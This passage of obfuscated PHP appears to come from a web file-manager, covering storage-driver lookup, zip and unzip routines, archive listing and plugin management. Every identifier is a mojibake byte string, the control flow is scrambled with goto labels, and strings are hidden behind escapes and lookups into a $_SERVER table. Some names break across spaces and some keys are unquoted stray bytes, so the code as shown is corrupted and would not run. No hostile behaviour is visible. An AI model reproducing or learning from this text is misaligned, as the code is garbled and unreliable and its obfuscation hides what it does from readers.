!self::$driverListSystem[$c¬ä‡¡Òƒ­[$cºæÂ„õ˜°[367]]]) { return !1; } $Fá½¼ÛÆÇä = $c¬ä‡¡Òƒ­[$cºæÂ„õ˜°[1015]]; $fÁä÷Ÿ¡ß¢ = self::driverGet($c¬ä‡¡Òƒ­, $Fá½¼ÛÆÇä); goto Dë‡’à¢ÍÁ; c•¢ô”Š‘¶: } private static function driverGet($cô»™ÆÀ‚ë, &$b›µ÷İ ‰õ) { goto B‹ÅÃÈ˜; eºÁ‘™Ö­ˆ: if (isset($d·³×¦[$CÛ±ùô¦õ[6]][$CÛ±ùô¦õ[1027]])) { $c˜”·ªáâ‡->pathBase = rtrim($d·³×¦[$CÛ±ùô¦õ[6]][$CÛ±ùô¦õ[1027]], $CÛ±ùô¦õ[8]) . $CÛ±ùô¦õ[8]; $b›µ÷İ ‰õ = $c˜”·ªáâ‡->pathBase . ltrim($b›µ÷İ ‰õ, $CÛ±ùô¦õ[8]); } $b›µ÷İ ‰õ = $c˜”·ªáâ‡->getPath($b›µ÷İ ‰õ); if (isset($cô»™ÆÀ‚ë[$CÛ±ùô¦õ[1001]])) { $b›µ÷İ ‰õ = $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[1001]]; } goto f¯Âİğ´×¯; aÀ…÷Ê—·¢: switch ($cô»™ÆÀ‚ë[$CÛ±ùô¦õ[29]]) { case KodIO::KOD_IO: $d·³×¦ = self::$driverListSystem[$dÎ¼‘ÕïŞâ]; break; case KodIO::KOD_SOURCE: $b›µ÷İ ‰õ = $dÎ¼‘ÕïŞâ . $b›µ÷İ ‰õ; $d·³×¦ = array($CÛ±ùô¦õ[1017] => $CÛ±ùô¦õ[1018], $CÛ±ùô¦õ[6] => $cô»™ÆÀ‚ë); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $cÀ‚˜¨Ãõ… = $GLOBALS[$CÛ±ùô¦õ[1019]]; self::$driverListUser = array_to_keyvalue($cÀ‚˜¨Ãõ…, $CÛ±ùô¦õ[367]); } $d·³×¦ = self::$driverListUser[$dÎ¼‘ÕïŞâ]; break; case KodIO::KOD_SHARE_LINK: $d·³×¦ = array($CÛ±ùô¦õ[1017] => $CÛ±ùô¦õ[1020], $CÛ±ùô¦õ[6] => $cô»™ÆÀ‚ë); $Dëô «Õå½ = Action($CÛ±ùô¦õ[1021])->sharePathInfo($cô»™ÆÀ‚ë[$CÛ±ùô¦õ[75]]); $b›µ÷İ ‰õ = $Dëô «Õå½[$CÛ±ùô¦õ[369]]; if (!$Dëô «Õå½[$CÛ±ùô¦õ[369]]) { $BÓËÏ„à´Ñ = Model($CÛ±ùô¦õ[537])->getInfo($Dëô «Õå½[$CÛ±ùô¦õ[441]]); $b›µ÷İ ‰õ = KodIO::clear($BÓËÏ„à´Ñ[$CÛ±ùô¦õ[1022]] . $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[1015]]); $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[439]] = $BÓËÏ„à´Ñ; $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[1001]] = $b›µ÷İ ‰õ; $d·³×¦ = array($CÛ±ùô¦õ[1017] => $CÛ±ùô¦õ[1023], $CÛ±ùô¦õ[6] => $cô»™ÆÀ‚ë); } break; case KodIO::KOD_SHARE_ITEM: $d·³×¦ = array($CÛ±ùô¦õ[1017] => $CÛ±ùô¦õ[1024], $CÛ±ùô¦õ[6] => $cô»™ÆÀ‚ë); $BÓËÏ„à´Ñ = Model($CÛ±ùô¦õ[537])->getInfo($cô»™ÆÀ‚ë[$CÛ±ùô¦õ[367]]); if ($BÓËÏ„à´Ñ[$CÛ±ùô¦õ[369]] == $CÛ±ùô¦õ[470]) { $b›µ÷İ ‰õ = KodIO::clear($BÓËÏ„à´Ñ[$CÛ±ùô¦õ[1022]] . $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[1015]]); $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[439]] = $BÓËÏ„à´Ñ; $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[1001]] = $b›µ÷İ ‰õ; $d·³×¦ = array($CÛ±ùô¦õ[1017] => $CÛ±ùô¦õ[1025], $CÛ±ùô¦õ[6] => $cô»™ÆÀ‚ë); } else { if (!$b›µ÷İ ‰õ) { $b›µ÷İ ‰õ = $BÓËÏ„à´Ñ[$CÛ±ùô¦õ[369]]; } } break; default: $b›µ÷İ ‰õ = $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[75]]; $d·³×¦ = array($CÛ±ùô¦õ[1017] => $CÛ±ùô¦õ[1026]); break; } $bÑ¤ã‰ÅÇÔ = $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[75]]; if (!isset(self::$driverCache[$bÑ¤ã‰ÅÇÔ])) { $eããõ–µ†Ş = strtolower($d·³×¦[$CÛ±ùô¦õ[90]]); $bêÌ¢æ§ = $GLOBALS[$CÛ±ùô¦õ[6]][$CÛ±ùô¦õ[84]][$CÛ±ùô¦õ[754]]; $c¯ò®Ïƒ¶è = $CÛ±ùô¦õ[71] . (isset($bêÌ¢æ§[$eããõ–µ†Ş]) ? $bêÌ¢æ§[$eããõ–µ†Ş] : ucfirst($eããõ–µ†Ş)); if (!class_exists($c¯ò®Ïƒ¶è)) { show_json("{$c¯ò®Ïƒ¶è}\40\x6e\x6f\164\40\x65\170\151\x73\x74\163\41", !1); } $E÷ñï‡‚Ä» = isset($d·³×¦[$CÛ±ùô¦õ[6]]) ? $d·³×¦[$CÛ±ùô¦õ[6]] : !1; self::$driverCache[$bÑ¤ã‰ÅÇÔ] = new $c¯ò®Ïƒ¶è($E÷ñï‡‚Ä»); } goto dãé‹¼º; B‹ÅÃÈ˜: $CÛ±ùô¦õ =& $_SERVER[¦·]; $B™›·‡ë¬è = $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[1016]]; $dÎ¼‘ÕïŞâ = $cô»™ÆÀ‚ë[$CÛ±ùô¦õ[367]]; goto aÀ…÷Ê—·¢; f¯Âİğ´×¯: $c˜”·ªáâ‡->path = $b›µ÷İ ‰õ; return $c˜”·ªáâ‡; goto c°ƒ»ƒ‹ä¿; dãé‹¼º: $c˜”·ªáâ‡ = self::$driverCache[$bÑ¤ã‰ÅÇÔ]; $c˜”·ªáâ‡->pathDriver = $B™›·‡ë¬è; $c˜”·ªáâ‡->pathBase = $CÛ±ùô¦õ[33]; goto eºÁ‘™Ö­ˆ; c°ƒ»ƒ‹ä¿: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $d±‹Üô°; if (!$d±‹Üô°) { $AİåÌÁéÌ = IO::init($_SERVER[¦·][8]); } return $AİåÌÁéÌ; } private static function iconvSystem($ağÊŠÖŒŠ) { return self::local()->iconvSystem($ağÊŠÖŒŠ); } private static function iconvApp($cÎî»¶º®) { return self::local()->iconvApp($cÎî»¶º®); } public static function zip($e–´·İïç×, $D¾Œ÷³ÃÌ– = "\172\151\x70", $EŒ½“ÜÙ‚ = '', $b‡î¿àÓÙê = REPEAT_RENAME) { goto bœİ¨–ÁËñ; EĞçîğùñ: if (!$F¬Šåæ™Šâ) { del_dir($d”¯ì™Èí¨); show_json(LNG($E˜©áª¯Çî[1030]), !1); } del_dir($d”¯ì™Èí¨); return $F¬Šåæ™Šâ; goto d»ÛôÁÆë¥; Dç‚ï÷¨‰˜: $d”¯ì™Èí¨ = !1; if (!$EŒ½“ÜÙ‚ && $e¾Ó‡Ş”Áè->getType() == $E˜©áª¯Çî[102]) { $B±ÚÌ‘÷‹É = self::zipFileList($e–´·İïç×); } else { $d”¯ì™Èí¨ = $EŒ½“ÜÙ‚ ? $EŒ½“ÜÙ‚ : TEMP_FILES . $E˜©áª¯Çî[1028] . time() . rand_string(8) . $E˜©áª¯Çî[8]; mk_dir($d”¯ì™Èí¨); $B±ÚÌ‘÷‹É = self::zipFileList($e–´·İïç×, $d”¯ì™Èí¨); } $cÀÔºÊ÷ç” = $b÷æêÒÍ™¤[$E˜©áª¯Çî[28]]; goto Aš‘Â˜š¨; D˜¥©íâà›: if ($EŒ½“ÜÙ‚ || !$d”¯ì™Èí¨) { if ($d”¯ì™Èí¨ && strstr($d”¯ì™Èí¨, TEMP_FILES)) { $a™ùñó­› = $B±ÚÌ‘÷‹É = array(); recursion_dir($F©ƒø…®, $a™ùñó­›, $B±ÚÌ‘÷‹É, 0); foreach ($a™ùñó­› as $CŒ‡Ú¼¶Î) { del_dir($CŒ‡Ú¼¶Î); } foreach ($B±ÚÌ‘÷‹É as $a÷™åå°ò¹) { if ($a÷™åå°ò¹ == $CÔßˆŒÇá) { continue; } del_file($a÷™åå°ò¹); } } return $cÄ±±¦Á‹Ÿ; } $a´ºê¢ÖˆÔ = self::pathFather($b÷æêÒÍ™¤[$E˜©áª¯Çî[75]]); $F¬Šåæ™Šâ = self::move($cÄ±±¦Á‹Ÿ, $a´ºê¢ÖˆÔ, $b‡î¿àÓÙê); goto EĞçîğùñ; Aš‘Â˜š¨: if (count($B±ÚÌ‘÷‹É) > 1) { $A«»Ÿ‹Ñ« = IO::info(IO::pathFather($b÷æêÒÍ™¤[$E˜©áª¯Çî[75]])); $cÀÔºÊ÷ç” = $A«»Ÿ‹Ñ«[$E˜©áª¯Çî[28]]; } $F©ƒø…® = $d”¯ì™Èí¨; if (!$F©ƒø…®) { $F©ƒø…® = get_path_father($b÷æêÒÍ™¤[$E˜©áª¯Çî[75]]); if (!$EŒ½“ÜÙ‚ && $e¾Ó‡Ş”Áè->getType() == $E˜©áª¯Çî[102]) { $F©ƒø…® = get_path_father($e¾Ó‡Ş”Áè->path); } $b•œÇ»¶Ğ = IO::info($F©ƒø…®); if (!$b•œÇ»¶Ğ[$E˜©áª¯Çî[189]]) { show_json(LNG($E˜©áª¯Çî[1029]), !1); } } goto fÇè ¸Å’; d¨š³ÌÊ¶: foreach ($B±ÚÌ‘÷‹É as $e…æŸ±¼‘ => $dŞ¯İù©µÀ) { $B±ÚÌ‘÷‹É[$e…æŸ±¼‘] = self::iconvSystem($dŞ¯İù©µÀ); } KodArchive::create($CÔßˆŒÇá, $B±ÚÌ‘÷‹É); if (!IO::exist($cÄ±±¦Á‹Ÿ)) { if ($d”¯ì™Èí¨) { del_dir($d”¯ì™Èí¨); } show_json(LNG($E˜©áª¯Çî[1030]), !1); } goto D˜¥©íâà›; fÇè ¸Å’: $cÄ±±¦Á‹Ÿ = $F©ƒø…® . $cÀÔºÊ÷ç” . $E˜©áª¯Çî[91] . $D¾Œ÷³ÃÌ–; $cÄ±±¦Á‹Ÿ = get_filename_auto($cÄ±±¦Á‹Ÿ, $E˜©áª¯Çî[33], $b‡î¿àÓÙê); $CÔßˆŒÇá = self::iconvSystem($cÄ±±¦Á‹Ÿ); goto d¨š³ÌÊ¶; bœİ¨–ÁËñ: $E˜©áª¯Çî =& $_SERVER[¦·]; $e¾Ó‡Ş”Áè = self::init($e–´·İïç×[0][$E˜©áª¯Çî[75]]); $b÷æêÒÍ™¤ = self::info($e–´·İïç×[0][$E˜©áª¯Çî[75]]); goto Dç‚ï÷¨‰˜; d»ÛôÁÆë¥: } public static function unzip($C”äĞ¹¬‹¢, $D÷ÙÌĞ­ÅŞ = "\162\x65\160\x6c\141\143\145") { goto EÔõŸäÚ•Ö; AÛùÄ©¥“ä: Hook::trigger($f›»ÕØ×’÷[1038], $dÛ˜ãÏ¼‘±); recursion_dir($dÛ˜ãÏ¼‘±, $D…áñ¶¹Ğ, $c‹Œ—‹ß¾, 0); $E±å¨ß’ó“ = array_merge($D…áñ¶¹Ğ, $c‹Œ—‹ß¾); goto f’˜¸İ—Ùé; B”ğ˜•±…°: $B•ÀšöŠ¢ê = self::tmpFileName($f­“êòìƒÎ); $dÛ˜ãÏ¼‘± = TEMP_FILES . $B•ÀšöŠ¢ê; del_dir($dÛ˜ãÏ¼‘±); goto e›ìŸ”Îõ¼; aÙ·–‰†µ: if (!@file_exists(self::iconvSystem($FçºÉ×ïªˆ))) { $bŸÇ½êÍ—˜ = self::localFilePath($EƒğÁêğ–, $FÇèÖç…Í·); $FçºÉ×ïªˆ = $bŸÇ½êÍ—˜ ? $bŸÇ½êÍ—˜ : parent::download($EƒğÁêğ–, $FçºÉ×ïªˆ); } $FçºÉ×ïªˆ = self::iconvSystem($FçºÉ×ïªˆ); $cÛ“¼²ÊÃ = isset($C”äĞ¹¬‹¢[$f›»ÕØ×’÷[1033]]) ? $C”äĞ¹¬‹¢[$f›»ÕØ×’÷[1033]] : $f›»ÕØ×’÷[1034]; goto cöŠù¶¤Š´; e›ìŸ”Îõ¼: mk_dir($dÛ˜ãÏ¼‘±); $FÇèÖç…Í· = self::fileExt($f­“êòìƒÎ); $FçºÉ×ïªˆ = $dÛ˜ãÏ¼‘± . $f›»ÕØ×’÷[91] . $FÇèÖç…Í·; goto aÙ·–‰†µ; EÔõŸäÚ•Ö: $f›»ÕØ×’÷ =& $_SERVER[¦·]; $EƒğÁêğ– = $C”äĞ¹¬‹¢[$f›»ÕØ×’÷[75]]; $DĞ–ÚğáÙ = $C”äĞ¹¬‹¢[$f›»ÕØ×’÷[1031]]; goto Fè³”ÈµÛ–; cöŠù¶¤Š´: $c¯–Û•ãé‚ = KodArchive::extract($FçºÉ×ïªˆ, $dÛ˜ãÏ¼‘± . $f›»ÕØ×’÷[8], $cÛ“¼²ÊÃ); self::archiveExt(); if (!$c¯–Û•ãé‚[$f›»ÕØ×’÷[1035]]) { show_json($f›»ÕØ×’÷[1036] . $c¯–Û•ãé‚[$f›»ÕØ×’÷[1037]], !1); } goto AÛùÄ©¥“ä; Fè³”ÈµÛ–: if (!($f­“êòìƒÎ = parent::info($EƒğÁêğ–))) { show_json(LNG($f›»ÕØ×’÷[1032]), !1); } if (!($b Ó˜š¯ê = parent::infoFull($DĞ–ÚğáÙ))) { $DĞ–ÚğáÙ = parent::mkdir($DĞ–ÚğáÙ); $b Ó˜š¯ê = array($f›»ÕØ×’÷[75] => $DĞ–ÚğáÙ); } else { if (isset($b Ó˜š¯ê[$f›»ÕØ×’÷[369]]) && trim($b Ó˜š¯ê[$f›»ÕØ×’÷[75]], $f›»ÕØ×’÷[8]) != trim($DĞ–ÚğáÙ, $f›»ÕØ×’÷[8])) { $eÌÒ‹…èº = KodIO::make($b Ó˜š¯ê[$f›»ÕØ×’÷[463]]); $B¦£‹ÊÄâÇ = parent::fileNameAuto($eÌÒ‹…èº, $b Ó˜š¯ê[$f›»ÕØ×’÷[28]], REPEAT_RENAME_FOLDER, !0); $DĞ–ÚğáÙ = parent::mkdir($eÌÒ‹…èº . $B¦£‹ÊÄâÇ); $b Ó˜š¯ê = array($f›»ÕØ×’÷[75] => $DĞ–ÚğáÙ); } } $DĞ–ÚğáÙ = $b Ó˜š¯ê[$f›»ÕØ×’÷[75]]; goto B”ğ˜•±…°; c¤…ÒÙŸÅ£: return !0; goto AÍ±ìïÏ‡; f’˜¸İ—Ùé: foreach ($E±å¨ß’ó“ as $F‚¸™“æ“À) { $F‚¸™“æ“À = self::iconvApp($F‚¸™“æ“À); self::move($F‚¸™“æ“À, $DĞ–ÚğáÙ, $D÷ÙÌĞ­ÅŞ); } del_dir($dÛ˜ãÏ¼‘±); if (!$bŸÇ½êÍ—˜) { del_file($FçºÉ×ïªˆ); } goto c¤…ÒÙŸÅ£; AÍ±ìïÏ‡: } public static function unzipList($A„‹Óêä°„) { goto Còö‹ê°·’; Còö‹ê°·’: $AâîÀìéƒ„ =& $_SERVER[¦·]; $C¸ğÃßî£¹ = $A„‹Óêä°„[$AâîÀìéƒ„[75]]; $EÛ¾†‚Ëë© = isset($A„‹Óêä°„[$AâîÀìéƒ„[1039]]) ? $A„‹Óêä°„[$AâîÀìéƒ„[1039]] : -1; goto E§õÑîÛ—; E›âÄš¤¨Á: self::archiveExt(); del_dir($eß§±¦—§); if (!$E¼Ë½•„Ò[$AâîÀìéƒ„[1035]]) { show_json($E¼Ë½•„Ò[$AâîÀìéƒ„[1037]], !1); } goto DíÖ¦ÏÓî; F÷ßÖÀå÷œ: $dŞ‹§¦óó± = self::iconvSystem($dŞ‹§¦óó±); if ($EÛ¾†‚Ëë© >= 0) { $f‡óŸ•Õ°Œ = isset($A„‹Óêä°„[$AâîÀìéƒ„[1043]]) ? $A„‹Óêä°„[$AâîÀìéƒ„[1043]] : !1; $b‰¥ÈÁÅÖ = isset($A„‹Óêä°„[$AâîÀìéƒ„[28]]) ? $A„‹Óêä°„[$AâîÀìéƒ„[28]] : $AâîÀìéƒ„[33]; KodArchive::filePreview($dŞ‹§¦óó±, $EÛ¾†‚Ëë©, $f‡óŸ•Õ°Œ, $b‰¥ÈÁÅÖ); self::archiveExt(); die; } $E¼Ë½•„Ò = KodArchive::listContent($dŞ‹§¦óó±); goto E›âÄš¤¨Á; DíÖ¦ÏÓî: $EŒ¬íé ç = json_encode($E¼Ë½•„Ò[$AâîÀìéƒ„[1037]]); self::setContent($aŒ³¯œ³, $EŒ¬íé ç); if (count($E¼Ë½•„Ò[$AâîÀìéƒ„[1037]]) >= $D×ˆ­áÕÖì) { show_json(sprintf(LNG($AâîÀìéƒ„[1041]), count($E¼Ë½•„Ò[$AâîÀìéƒ„[1037]])), !1); } goto c£—Ø•öô½; c£—Ø•öô½: return $E¼Ë½•„Ò[$AâîÀìéƒ„[1037]]; goto EğîÒÔùØå; Cğ…ÃË®”Ì: if (isset($BÜÈËÛİğ)) { $bºÙ‰Çô¢ = array($BÜÈËÛİğ[$AâîÀìéƒ„[75]], $BÜÈËÛİğ[$AâîÀìéƒ„[1039]], $BÜÈËÛİğ[$AâîÀìéƒ„[28]]); $dáˆã—®› = md5(implode($AâîÀìéƒ„[70], $bºÙ‰Çô¢)) . $AâîÀìéƒ„[91] . get_path_ext($BÜÈËÛİğ[$AâîÀìéƒ„[28]]); } else { $bºÙ‰Çô¢ = array($B‚¨‹ˆ°†±[$AâîÀìéƒ„[28]], $B‚¨‹ˆ°†±[$AâîÀìéƒ„[75]], $B‚¨‹ˆ°†±[$AâîÀìéƒ„[77]]); $dáˆã—®› = md5(implode($AâîÀìéƒ„[70], $bºÙ‰Çô¢)) . $AâîÀìéƒ„[91] . $eÛ»ÜÃ”Ğ; } if ($EÛ¾†‚Ëë© == -1) { $aŒ³¯œ³ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\x56\x69\x65\167\57{$DáŒåµ‚©ò}\x2f{$dáˆã—®›}\56\x6c\x6f\x67"; $CÓ¼‡«‚œÔ = self::infoFull($aŒ³¯œ³); if ($CÓ¼‡«‚œÔ) { $aŒ³¯œ³ = $CÓ¼‡«‚œÔ[$AâîÀìéƒ„[75]]; $f—‰‚ßÂ’ï = self::getContent($aŒ³¯œ³); if ($f—‰‚ßÂ’ï) { $EŒ¬íé ç = json_decode($f—‰‚ßÂ’ï, !0); if (count($EŒ¬íé ç) >= $D×ˆ­áÕÖì) { show_json(sprintf(LNG($AâîÀìéƒ„[1041]), count($EŒ¬íé ç)), !1); } return $EŒ¬íé ç; } } else { $aŒ³¯œ³ = self::mkfile($aŒ³¯œ³); } } $eß§±¦—§ = TEMP_FILES . $DáŒåµ‚©ò; goto e“±½¤Ú†Š; e“±½¤Ú†Š: if (!is_dir($eß§±¦—§)) { mk_dir($eß§±¦—§); } $dŞ‹§¦óó± = $eß§±¦—§ . $AâîÀìéƒ„[8] . $dáˆã—®›; if (!@file_exists(self::iconvSystem($dŞ‹§¦óó±))) { if (isset($BÜÈËÛİğ)) { url_request($C¸ğÃßî£¹, $AâîÀìéƒ„[1042], $dŞ‹§¦óó±); } else { $BŞ…¿†¿½ = self::localFilePath($C¸ğÃßî£¹, $eÛ»ÜÃ”Ğ); $dŞ‹§¦óó± = $BŞ…¿†¿½ ? $BŞ…¿†¿½ : self::download($C¸ğÃßî£¹, $dŞ‹§¦óó±); } } goto F÷ßÖÀå÷œ; E§õÑîÛ—: $D×ˆ­áÕÖì = 50000; if (request_url_safe($C¸ğÃßî£¹)) { $BÜÈËÛİğ = parse_url_query($C¸ğÃßî£¹); if (!isset($BÜÈËÛİğ[$AâîÀìéƒ„[75]])) { show_json($AâîÀìéƒ„[1040], !1); } } $d–½æ±’‚‰ = isset($BÜÈËÛİğ) ? $BÜÈËÛİğ[$AâîÀìéƒ„[75]] : $C¸ğÃßî£¹; goto f ‰²ŞÈ›Ç; f ‰²ŞÈ›Ç: $B‚¨‹ˆ°†± = self::info($d–½æ±’‚‰); $eÛ»ÜÃ”Ğ = self::fileExt($B‚¨‹ˆ°†±); $DáŒåµ‚©ò = self::tmpFileName($B‚¨‹ˆ°†±); goto Cğ…ÃË®”Ì; EğîÒÔùØå: } private static function fileExt($eØÅáÔÖÃù) { $dø÷¥öªÀá =& $_SERVER[¦·]; $cß…Âé÷ = $eØÅáÔÖÃù[$dø÷¥öªÀá[160]]; if ($cß…Âé÷ == $dø÷¥öªÀá[1044]) { $DäÔ¶¡åŒ¦ = $dø÷¥öªÀá[1045]; if (substr($eØÅáÔÖÃù[$dø÷¥öªÀá[28]], -strlen($DäÔ¶¡åŒ¦)) == $DäÔ¶¡åŒ¦) { $cß…Âé÷ = $dø÷¥öªÀá[1046]; } } self::archiveExt($cß…Âé÷); return $cß…Âé÷; } private static function zipFileList($a… ´Ô§Õ, $eº¦±ø¦‡ = false) { $dôÀ ¼ßº =& $_SERVER[¦·]; $Dğ®Áğ›İ = array(); foreach ($a… ´Ô§Õ as $bŠ­İ¯Ÿ›†) { $e‘Òíö¶É = $bŠ­İ¯Ÿ›†[$dôÀ ¼ßº[75]]; if ($eº¦±ø¦‡) { $e‘Òíö¶É = self::copy($bŠ­İ¯Ÿ›†[$dôÀ ¼ßº[75]], $eº¦±ø¦‡, $dôÀ ¼ßº[745]); } else { $Eƒ£ÛÙ‰‹ = self::init($bŠ­İ¯Ÿ›†[$dôÀ ¼ßº[75]]); if ($Eƒ£ÛÙ‰‹->getType() == $dôÀ ¼ßº[102]) { $e‘Òíö¶É = $Eƒ£ÛÙ‰‹->path; } } if ($e‘Òíö¶É && self::local()->exist($e‘Òíö¶É)) { $Dğ®Áğ›İ[$bŠ­İ¯Ÿ›†[$dôÀ ¼ßº[75]]] = $e‘Òíö¶É; } } if (!empty($Dğ®Áğ›İ)) { return array_values($Dğ®Áğ›İ); } show_json(LNG($dôÀ ¼ßº[1047]), !1); } public static function tmpFileName($EÃ¸ÄÎ·‹) { $dö¶£“„½ =& $_SERVER[¦·]; $FŠìŸ–¶•¢ = array($EÃ¸ÄÎ·‹[$dö¶£“„½[28]], $EÃ¸ÄÎ·‹[$dö¶£“„½[75]], $EÃ¸ÄÎ·‹[$dö¶£“„½[77]], $EÃ¸ÄÎ·‹[$dö¶£“„½[461]]); return md5(implode($dö¶£“„½[70], $FŠìŸ–¶•¢)); } private static function localFilePath($a™È›Î¢×, $B˜‘îè„Ôä) { goto c¤õœä´‹Ù; aä£®º×î¶: if ($eƒÛœÔ³Õ½ == $e¼è¨‰¨İ©[102] || $eƒÛœÔ³Õ½ == $e¼è¨‰¨İ©[1051]) { if (!$AÚïºÖ¡íš->exist($AÚïºÖ¡íš->path)) { show_json(LNG($e¼è¨‰¨İ©[101]), !1); } return $AÚïºÖ¡íš->path; } return !1; goto AÔÖ÷êÍÄ; b—„¡áœÂ°: if ($a²ˆªññàï[$e¼è¨‰¨İ©[29]] == KodIO::KOD_SOURCE) { $BÆè¿õÁè– = Model($e¼è¨‰¨İ©[753])->fileInfoGet(KodIO::sourceID($a™È›Î¢×)); if (!$BÆè¿õÁè–[$e¼è¨‰¨İ©[75]]) { show_json($e¼è¨‰¨İ©[1050], !1); } $a™È›Î¢× = $BÆè¿õÁè–[$e¼è¨‰¨İ©[75]]; } $AÚïºÖ¡íš = self::init($a™È›Î¢×); $eƒÛœÔ³Õ½ = $AÚïºÖ¡íš->getType(); goto aä£®º×î¶; c¤õœä´‹Ù: $e¼è¨‰¨İ© =& $_SERVER[¦·]; if ($B˜‘îè„Ôä == $e¼è¨‰¨İ©[1048] && strtoupper(substr(PHP_OS, 0, 3)) == $e¼è¨‰¨İ©[1049]) { return !1; } $a²ˆªññàï = KodIO::parse($a™È›Î¢×); goto b—„¡áœÂ°; AÔÖ÷êÍÄ: } private static function archiveExt($E„”é’ÃÄÌ = '') { $GLOBALS[$_SERVER[¦·][1052]] = $E„”é’ÃÄÌ; } } goto b¤’‘÷ô¡; b¶–ô½ø½”: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x70\154\x75\x67\x69\x6e\114\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\x73\x74\141\164\165\163", "\162\145\147\x69\x65\x73\x74", "\143\x6f\156\x66\151\x67"); public function loadList($eÙèçãìØ³ = false) { $cÌ°•Ãˆ‘ = array_to_keyvalue($this->listData(), $_SERVER[¦·][28]); if ($eÙèçãìØ³) { return $cÌ°•Ãˆ‘[$eÙèçãìØ³]; } return $cÌ°•Ãˆ‘; } public function init() { $bğÔ„©©µ„ =& $_SERVER[¦·]; Hook::trigger($bğÔ„©©µ„[2217]); $Cé°Å¡ôë = $this->loadPluginList(); foreach ($Cé°Å¡ôë as $F˜¾”¹Í² => $aˆ¼¯‹âŞ) { $Eµ­•§¿½õ = $this->appAllow($F˜¾”¹Í², $aˆ¼¯‹âŞ); if (!$Eµ­•§¿½õ) { continue; } foreach ($aˆ¼¯‹âŞ[$bğÔ„©©µ„[2218]] as $c®’éñ¬Ö => $eÂÌ˜†§½) { Hook::bind($c®’éñ¬Ö, $eÂÌ˜†§½); } } Hook::trigger($bğÔ„©©µ„[2219]); Hook::trigger(ACTION); } public function appAllow($d°´­Ñ—í, $aõé¹³š™, $f–ÜØ–‹ñ = true) { $bó÷ô™êò‰ =& $_SERVER[¦·]; $F –ì§÷ùË = PLUGIN_DIR . $d°´­Ñ—í . $bó÷ô™êò‰[2220]; if (!is_array($aõé¹³š™) || !is_array($aõé¹³š™[$bó÷ô™êò‰[2218]]) || !is_file($F –ì§÷ùË) || $aõé¹³š™[$bó÷ô™êò‰[690]] != 1) { return !1; } if ($f–ÜØ–‹ñ && !Action($bó÷ô™êò‰[2221])->checkAuth($d°´­Ñ—í)) { return !1; } return !0; } public function unInstall($fóØ¿¬‰ßÇ) { $dÕÇÑõİİã =& $_SERVER[¦·]; $EËÃƒ²¼®Ê = $this->loadList($fóØ¿¬‰ßÇ); if (file_exists(PLUGIN_DIR . $fóØ¿¬‰ßÇ)) { Hook::apply($fóØ¿¬‰ßÇ . $dÕÇÑõİİã[2222]); } $this->remove($EËÃƒ²¼®Ê[$dÕÇÑõİİã[367]]); } public function changeStatus($e¶°Êˆíõ, $E²ˆ¡§¿…Õ) { $e¢¨Î™´Ô =& $_SERVER[¦·]; $FÎã©Ó†óÙ = $this->loadList($e¶°Êˆíõ); if ($E²ˆ¡§¿…Õ) { Hook::apply($e¶°Êˆíõ . $e¢¨Î™´Ô[2223]); } $this->update($FÎã©Ó†óÙ[$e¢¨Î™´Ô[367]], array($e¢¨Î™´Ô[2224] => $E²ˆ¡§¿…Õ)); } public function appRegist($a•İàğóêå, $d¨•±ªß•”) { $AÑÁ”á¤•À =& $_SERVER[¦·]; $cƒÆ³’çŸö = $this->loadList($a•İàğóêå); if ($cƒÆ³’çŸö) { $this->update($cƒÆ³’çŸö[$AÑÁ”á¤•À[367]], array($AÑÁ”á¤•À[2218] => $d¨•±ªß•”)); } else { $eÒõ”‘¸¾³ = array($AÑÁ”á¤•À[28] => $a•İàğóêå, $AÑÁ”á¤•À[2218] => $d¨•±ªß•”, $AÑÁ”á¤•À[690] => 0, $AÑÁ”á¤•À[6] => $this->getConfigDefault($a•İàğóêå)); $this->insert($eÒõ”‘¸¾³); } } public function getConfigDefault($AÜŠ˜ˆ…ˆæ) { $DõÌàßÇàË =& $_SERVER[¦·]; $EçğÇß•Ğó = array(); $D‹ìóÑõÍê = $this->getPackageJson($AÜŠ˜ˆ…ˆæ); if (!$D‹ìóÑõÍê && is_array($D‹ìóÑõÍê[$DõÌàßÇàË[2225]])) { return $EçğÇß•Ğó; } foreach ($D‹ìóÑõÍê[$DõÌàßÇàË[2225]] as $bòµï¢Š–Ü => $bÂ³µ²Âğ®) { if (!isset($bÂ³µ²Âğ®[$DõÌàßÇàË[359]]) || isset($EçğÇß•Ğó[$bòµï¢Š–Ü])) { continue; } $EçğÇß•Ğó[$bòµï¢Š–Ü] = $bÂ³µ²Âğ®[$DõÌàßÇàË[359]]; } return $EçğÇß•Ğó; } public function getPackageJson($AïÅÍ“ŠŒ¬) { return Hook::apply($AïÅÍ“ŠŒ¬ . $_SERVER[¦·][2226]); } public function getConfig($eã· †¶‹, $D‡„¸Òøó½ = false) { $bÁ«”¬Ïèù =& $_SERVER[¦·]; $eĞ†»×öò = array(); $B½ÊÛ‘ÊØÑ = $this->loadList($eã· †¶‹); if ($B½ÊÛ‘ÊØÑ && is_array($B½ÊÛ‘ÊØÑ[$bÁ«”¬Ïèù[6]])) { $eĞ†»×öò = $B½ÊÛ‘ÊØÑ[$bÁ«”¬Ïèù[6]]; } if (!$eĞ†»×öò || $D‡„¸Òøó½) { $eĞ†»×öò = $this->getConfigDefault($eã· †¶‹); } return $eĞ†»×öò; } public function setConfig($d¡ŸŸ…ƒ¡, $c»¸£ËÄÀ© = false) { goto B¤ñ²¿ß; cÏƒ¸Ùáï£: $this->update($bÅ—ù»š[$cÃ¿ŸÒ™ÒŠ[367]], array($cÃ¿ŸÒ™ÒŠ[6] => $d‰©øõ˜Ó)); goto aòä¤ƒ£; eù°±»•ó: $d‰©øõ˜Ó = $bÅ—ù»š[$cÃ¿ŸÒ™ÒŠ[6]]; if ($c»¸£ËÄÀ© == !1) { $d‰©øõ˜Ó = 